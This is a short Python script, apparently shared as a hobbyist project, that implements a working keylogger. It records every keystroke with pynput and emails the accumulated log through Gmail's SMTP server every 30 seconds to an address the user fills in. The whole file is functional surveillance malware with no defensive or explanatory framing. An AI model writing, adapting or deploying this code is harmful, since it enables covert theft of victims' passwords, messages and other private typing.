#Keylogger 
import pynput.keyboard
import smtplib
import threading
print('''  _____                 _                      _   _              _____           _                  __  __ 
 |  __ \               | |                    | | | |            / ____|         (_)                / _|/ _|
 | |  | | _____   _____| | ___  _ __   ___  __| | | |__  _   _  | |  __  __ _ ___ _ _ __ ___   ___ | |_| |_ 
 | |  | |/ _ \ \ / / _ \ |/ _ \| '_ \ / _ \/ _` | | '_ \| | | | | | |_ |/ _` / __| | '_ ` _ \ / _ \|  _|  _|
 | |__| |  __/\ V /  __/ | (_) | |_) |  __/ (_| | | |_) | |_| | | |__| | (_| \__ \ | | | | | | (_) | | | |  
 |_____/ \___| \_/ \___|_|\___/| .__/ \___|\__,_| |_.__/ \__, |  \_____|\__,_|___/_|_| |_| |_|\___/|_| |_|  
                               | |                        __/ |                                             
                               |_|                       |___/''')
print(''' __ _             _   _                 ___                                      
/ _| |_ __ _ _ __| |_(_)_ __   __ _    / _ \_ __ ___   ___ ___ ___ ___ ___       
\ \| __/ _` | '__| __| | '_ \ / _` |  / /_)| '__/ _ \ / __/ __/ _ / __/ __|      
_\ | || (_| | |  | |_| | | | | (_| | / ___/| | | (_) | (_| (_|  __\__ \__ \_ _ _ 
\__/\__\__,_|_|   \__|_|_| |_|\__, | \/    |_|  \___/ \___\___\___|___|___(_(_(_)
                              |___/       ''')
log=""

def callback_function(key):
    global log
    try:
        log=log + str(key.char)
    except AttributeError:
        if key==key.space:
            log=log + " "
        else:
            log=log + str(key)
    print(log)

def send_email(email,password,message):
    email_server=smtplib.SMTP("smtp.gmail.com",587)
    email_server.ehlo()
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

def thread_function():
    global log
    send_email("Your gmail address", "Your gmail password", log)
    log = ""
    timer_object=threading.Timer(30,thread_function)
    timer_object.start()

keylogger_listener=pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()

